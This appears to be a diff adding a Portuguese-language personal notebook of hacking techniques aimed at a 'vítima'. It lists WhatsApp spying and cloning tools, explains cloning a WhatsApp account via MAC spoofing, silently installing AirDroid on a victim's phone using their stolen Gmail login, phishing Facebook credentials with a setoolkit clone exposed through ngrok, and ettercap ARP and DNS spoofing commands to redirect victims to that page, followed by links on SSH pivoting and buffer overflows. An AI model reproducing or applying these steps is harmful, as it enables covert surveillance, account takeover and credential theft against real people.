@@ -1,0 +1,178 @@
+1- Disa
+2- QRLjackting
+3- Bruno Espião
+4- Suport whatsap
+5- QRCode whats
+6- Whats-Hacks
+7- Localizar onde foto foi tirada
+8- Spyzie
+9- WhatsAppHacker
+10- Clonar whatsapp via Mac... usa o Macchanger e um apk que entre no whatsapp como Disa e ou o proprio apk do whatsapp zerado. ***OBS EXTREMAMENTE IMPORTANTES
+1- na hora de trocar o mac mantenha o celular  conectado ao wifi assim ele não esperará o codigo validando direto o acesso...
+2- Para a clonagem ser permanente é necessário preparar um esquema secundário via WhatsApp Web em um browser de PC para bipar o QRcode. 
+
+Acesso Total a Interact Android.
+
+11- AirDroid - Android on Computer
+
+Tutorial
+
+Esse é um programa de computador bem simples para facilitar a vida do usuario...
+E claro que pode também causar muitos problemas se alguém obter suas informações de login da conta Gmail... ja que estas informações dão total acesso ao seu android.
+
+Entrando via pc na sua conta gmail.. abra sua playstore via PC... procure o AirDroid
+e click em instala-lo, como você está conectado na mesma conta que o celular a instalação será feita no CELULAR da vitima assim que acessar a internet.
+
+Logo em seguida no seu browser pesquise por AirDroid Web. Aqui é a pagina de acesso online.. onde você verá a tela e vai monitorar etc.... mais isso só é possivel se tiver o email e a senha gmail da vitima.
+
+O que pode-se obter tendo apenas o id ou a conta (email) do gmail.
+
+Temos um otimo tutorial sobre isso, na pasta Videos.
+
+
+12- Para uma conexão reversa sem interface grafica usamos os payloads apk e suas variacoes.
+
+
+
+
+Instalando Chrome in KALI
+
+apt install gdebi
+
+https://translate.google.com/translate?hl=pt-BR&sl=en&u=https://linuxconfig.org/how-to-install-google-chrome-browser-on-kali-linux&prev=search
+
+
+--------------------------------------------------------------------------------------------
+
+Clonando FishingBook (capturando senha e email do Facebook)
+
+Passo 1- LIVE KALI 2016.1 rm /var/www/html/* + Alinhamento de Portas Ngrok 8080 e apache2 8080.
+Passo 2- Usar parte apos as barras do endereco ngrok na hora de setar o ip no setoolkit.
+Passo 3- y para ativar o apache2, ENTER e finalmente Enviar link puro sem porta.
+
+Observar tempo da janela ngrok e manter-se atualizando cat /var/www/html/h+TAB
+
+--------------------------------------------------------------------------------------------
+
+https://h3brasil.wordpress.com/2015/03/28/hackeando-facebook-gmail-etc-usando-ettercap-e-setoolkit/
+
+Abra outro terminal   
+
+nano /etc/ettercap/etter.dns
+
+2 – Vamos Redirecionar qualquer requisição HTTP,HTTPS para o nosso IP (interno ou EXTERNO)
+
+Vamos localizar o arquivo de configuração de redirecionamento do ettercap.
+Então,digitamos no terminal :
+
+locate etter.dns
+
+Agora,vamos digitar :
+nano /usr/share/ettercap/etter.dns
+(Você pode usar o editor de texto que você quiser,exemplo : Gedit )
+
+Editaremos onde está escrito :
+################################
+# microsoft sucks ;   )
+# redirect it to www.linux.org
+#
+
+Agora é só alterar o IP que está pelo o seu.Se você quiser colocar mais sites para ser redirecionado, clolque :
+
+exemplo :
+
+https://www.google.com.br/?gws_rd=ssl A 92.168.0.11
+http://www.youtube.com A 192.168.0.11
+http://www.yahoo.com A 192.168.0.11
+https://www.facebook.com A 192.168.0.11
+
+ou para pegar de qualquer site 
+
+*  A  192.168.0.11
+
+Considerando que 192.168.0.11 seja o seu IP.
+
+Salve o arquivo e saia.
+
+Quarto e último passo.
+
+4 – Redirecionando com o ettercap
+
+Você precisa de uma interface de rede,no meu caso wlan0,então vamos lá…
+
+Digite :
+ettercap -T -q -M arp -i wlan0 -P dns_spoof ///
+
+ettercap -T -q -M arp -i eth0 -P dns_spoof ///
+
+ver xerosploit redir por sslstrip att 2018 https
+https://www.youtube.com/watch?v=yw9OrnjrKjA
+
+(Se a sua interface de rede for diferente,mude apenas o wlan0 para outra interface,nada mais!!!)
+
+PODE USAR A INTRO DO TXT ATAQUE SSLSTRIP
+
+PRONTO !!!
+
+é só esperar a sua “vítima” acessas algum site que você colocou no arquivo do ettercap,e quando essa pessoa acessar será redirecionada para o site que você clonou com o set e está rodando no apache.
+
+“Desfrute do seu conhecimento”
+By : ol4t1
+
+-----------------------------------------------------------------------------------------------
+
+Pivoting SSH invasao de servidores
+
+https://translate.google.com.br/translate?hl=pt-BR&sl=en&u=https://blog.techorganic.com/2012/10/06/introduction-to-pivoting-part-1-ssh/&prev=search
+
+melhor
+
+https://translate.google.com.br/translate?hl=pt-BR&sl=en&u=https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/&prev=search
+
+
+
+FOCO ATUAL DOMINAR ESSES PROTOCOLOS:
+
+ftp, ssh, https, smtp, smnp
+
+PESQUISAR FALHAS KRACK, e Demais de Protocolos Seguros.
+
+>SSH<
+
+https://www.youtube.com/watch?v=lzmcO6W-t78
+
+https://www.weblink.com.br/blog/tecnologia/acesso-ssh-o-que-e/
+
+https://www.hostinger.com.br/tutoriais/lista-de-comandos-basicos-ssh/
+
+
+ssh username@<ip ou nome de dominio apontado>
+ex: ssh root@blackcyber.ddns.net
+
+BYPASS EM SSH TOP
+
+https://www.youtube.com/watch?v=mRr80CUgsNk
+
+pivoiting ssh com Kali
+
+https://www.youtube.com/watch?v=7M0W1ZuGx6I
+
+https://www.youtube.com/watch?v=g7FWPbty7MU
+
+
+----------------------------------------------------------------------------------------------
+
+ATAQUE BUFFER OVER FLOW KALI TUTORIAL
+
+https://www.welivesecurity.com/br/2014/11/11/o-que-e-e-como-funciona-o-buffer-overflow/
+
+Na pratica
+
+https://www.youtube.com/watch?v=eYrfWpkvMxA
+
+perguntar ao google durante o video...
+------------------------------------------------------------------------------------------------
+
+OWASP peincipais VULNERABILIDADES 2013-2017...
+
+https://www.youtube.com/watch?v=0PyjxuJNmVo
